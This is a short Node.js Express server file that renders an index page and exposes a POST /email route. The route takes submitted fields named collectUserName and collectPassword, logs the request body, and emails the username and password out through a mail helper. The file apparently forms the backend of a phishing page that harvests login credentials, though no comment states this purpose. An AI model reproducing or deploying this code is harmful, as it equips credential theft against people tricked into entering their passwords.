var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var cors = require('cors');
var sendMail = require('./mail')
require('dotenv').config();


var app = express();

// view engine setup


app.set('view engine', 'ejs');

app.use(express.static(path.join(__dirname, 'views')));



app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());



//data parsing
app.use(express.urlencoded({
  extended: false
}))
app.use(express.json())
app.use(cors())


//Router to render hompage
app.get('/', (req,res)=> {
  res.render('index.ejs')
})

app.post('/email', (req,res) => {
  const {collectUserName, collectPassword} = req.body
  console.log('Data:', req.body)

  sendMail(collectUserName, collectPassword, function(err, data) {
      if (err) {
          res.status(500).json({message: 'internal error',err})
      }else{
          res.json({message:'Email Sent!'})
      }
  })

})

module.exports = app;
